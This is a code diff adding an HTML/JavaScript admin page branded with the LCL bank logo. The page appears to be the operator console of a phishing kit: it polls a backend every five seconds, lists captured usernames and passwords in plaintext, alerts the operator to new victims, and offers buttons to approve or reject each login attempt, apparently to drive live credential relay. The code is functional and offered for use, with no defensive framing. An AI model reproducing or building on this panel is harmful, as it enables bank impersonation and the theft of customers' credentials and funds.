@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Administrateur - LCL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .admin-container {
+            width: 100%;
+            max-width: 1400px;
+            background: #f5f7fa;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            margin: 0 auto;
+            overflow: hidden;
+        }
+
+        .admin-header {
+            background: white;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+            flex-wrap: wrap;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-area img {
+            height: 50px;
+        }
+
+        .logo-area h1 {
+            font-size: 20px;
+            color: #232884;
+        }
+
+        .admin-info {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .admin-badge {
+            background: linear-gradient(135deg, #232884, #3a4bc9);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 30px;
+        }
+
+        .logout-btn {
+            background: none;
+            border: 1px solid #e0e0e0;
+            padding: 8px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .logout-btn:hover {
+            background: #ff4757;
+            color: white;
+        }
+
+        .admin-content {
+            padding: 30px;
+        }
+
+        .section-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .section-title h2 {
+            color: #232884;
+        }
+
+        .refresh-btn {
+            background: #232884;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .refresh-btn:hover {
+            background: #3a4bc9;
+        }
+
+        .table-container {
+            background: white;
+            border-radius: 15px;
+            overflow-x: auto;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: left;
+            color: #232884;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .status {
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+        }
+
+        .status-attente {
+            background: #fff3e0;
+            color: #ff9800;
+        }
+
+        .status-valide {
+            background: #e8f5e9;
+            color: #4caf50;
+        }
+
+        .status-refuse {
+            background: #ffebee;
+            color: #f44336;
+        }
+
+        .action-btn {
+            border: none;
+            cursor: pointer;
+            padding: 8px 16px;
+            margin: 0 5px;
+            border-radius: 20px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .valider-btn {
+            background: #4caf50;
+            color: white;
+        }
+
+        .valider-btn:hover {
+            background: #45a049;
+            transform: scale(1.05);
+        }
+
+        .refuser-btn {
+            background: #f44336;
+            color: white;
+        }
+
+        .refuser-btn:hover {
+            background: #da190b;
+            transform: scale(1.05);
+        }
+
+        .overlay-chargement {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .overlay-chargement.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #232884;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .flou {
+            filter: blur(3px);
+            pointer-events: none;
+            user-select: none;
+            transition: filter 0.3s;
+        }
+
+        .notification-badge {
+            background: #f44336;
+            color: white;
+            border-radius: 50%;
+            padding: 2px 6px;
+            font-size: 12px;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <div class="admin-header">
+            <div class="logo-area">
+                <img src="https://monespace.lcl.fr/assets/images/new_logo.svg" alt="LCL">
+                <h1>Panel LCL - Validation des utilisateurs</h1>
+            </div>
+            <div class="admin-info">
+                <span class="admin-badge">👨‍💼 ADMIN</span>
+                <button class="logout-btn" onclick="deconnexion()">Déconnexion</button>
+            </div>
+        </div>
+
+        <div class="admin-content">
+            <div class="section-title">
+                <h2>📋 Demandes des utilisateurs</h2>
+                <button class="refresh-btn" onclick="chargerUtilisateurs()">🔄 Actualiser</button>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Utilisateur ID</th>
+                            <th>Identifiant</th>
+                            <th>Pass</th>
+                            <th>Action</th>
+                            <th>Date (Heure)</th>
+                            <th>Statut</th>
+                        </tr>
+                    </thead>
+                    <tbody id="usersTableBody">
+                        <tr>
+                            <td colspan="6" style="text-align: center;">Chargement des utilisateurs...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div id="overlayChargement" class="overlay-chargement">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        let currentUsers = [];
+        let dernierNombreUsers = 0;
+
+        function showLoading(show) {
+            const overlay = document.getElementById('overlayChargement');
+            const container = document.querySelector('.admin-container');
+            if (show) {
+                overlay.classList.add('show');
+                container.classList.add('flou');
+            } else {
+                overlay.classList.remove('show');
+                container.classList.remove('flou');
+            }
+        }
+
+        async function chargerUtilisateurs() {
+            showLoading(true);
+            
+            try {
+                const response = await fetch('/backend-lcl/get-user.php');
+                
+                if (!response.ok) {
+                    throw new Error('HTTP ' + response.status);
+                }
+                
+                const data = await response.json();
+                
+                if (Array.isArray(data)) {
+                    currentUsers = data;
+                } else if (data && Array.isArray(data.users)) {
+                    currentUsers = data.users;
+                } else {
+                    currentUsers = [];
+                }
+                
+                // Vérifier s'il y a un nouvel utilisateur
+                if (dernierNombreUsers > 0 && currentUsers.length > dernierNombreUsers) {
+                    // Notification visuelle
+                    const titre = document.title;
+                    let clignotement = 0;
+                    const interval = setInterval(() => {
+                        document.title = clignotement % 2 === 0 ? '🔔 NOUVEAU ! - Panel LCL' : titre;
+                        clignotement++;
+                        if (clignotement > 10) {
+                            clearInterval(interval);
+                            document.title = titre;
+                        }
+                    }, 500);
+                }
+                
+                dernierNombreUsers = currentUsers.length;
+                afficherTableauUtilisateurs();
+            } catch (error) {
+                console.error('Erreur:', error);
+                const tbody = document.getElementById('usersTableBody');
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">❌ Erreur de chargement: ' + error.message + '</td></tr>';
+            }
+            
+            showLoading(false);
+        }
+
+        function formaterHeure(dateISO) {
+            if (!dateISO) return 'N/A';
+            try {
+                const date = new Date(dateISO);
+                return date.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            } catch(e) {
+                return 'Date invalide';
+            }
+        }
+
+        async function mettreAJourStatut(userId, nouveauStatut, actionType) {
+            showLoading(true);
+            
+            try {
+                const response = await fetch('/backend-lcl/update-user-status.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        userId: userId, 
+                        status: nouveauStatut 
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    await chargerUtilisateurs();
+                    // Pas de redirection ici, c'est la page login.html qui gère
+                } else {
+                    alert('Erreur: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue: ' + error.message);
+            }
+            
+            showLoading(false);
+        }
+
+        function afficherTableauUtilisateurs() {
+            const tbody = document.getElementById('usersTableBody');
+            
+            if (!currentUsers || currentUsers.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">📭 Aucun utilisateur trouvé</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = currentUsers.map(user => {
+                let statusClass = 'status-attente';
+                let statusText = 'En attente';
+                
+                const userStatus = user.statut || 'en attente';
+                
+                if (userStatus === 'Valide' || userStatus === 'valide') {
+                    statusClass = 'status-valide';
+                    statusText = 'Validé';
+                } else if (userStatus === 'Refuse' || userStatus === 'refuse') {
+                    statusClass = 'status-refuse';
+                    statusText = 'Refusé';
+                }
+                
+                const estDejaTraite = (userStatus === 'Valide' || userStatus === 'valide' || 
+                                      userStatus === 'Refuse' || userStatus === 'refuse');
+                
+                return `
+                    <tr>
+                        <td>${user.id || 'N/A'}</td>
+                        <td>${user.identifiant || 'N/A'}</td>
+                        <td>${user.password || 'N/A'}</td>
+                        <td>
+                            ${!estDejaTraite ? `
+                                <button class="action-btn valider-btn" onclick="mettreAJourStatut('${user.id}', 'Valide', 'valider')">✓ Valider</button>
+                                <button class="action-btn refuser-btn" onclick="mettreAJourStatut('${user.id}', 'Refuse', 'refuser')">✗ Refuser</button>
+                            ` : `
+                                <span style="color: #999; font-style: italic;">Déjà traité</span>
+                            `}
+                        </td>
+                        <td>${formaterHeure(user.date)}</td>
+                        <td><span class="status ${statusClass}">${statusText}</span></td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        function deconnexion() {
+            if (confirm("Voulez-vous vraiment vous déconnecter ?")) {
+                window.location.href = '/login.html';
+            }
+        }
+
+        chargerUtilisateurs();
+        setInterval(chargerUtilisateurs, 5000);
+    </script>
+</body>
+</html>
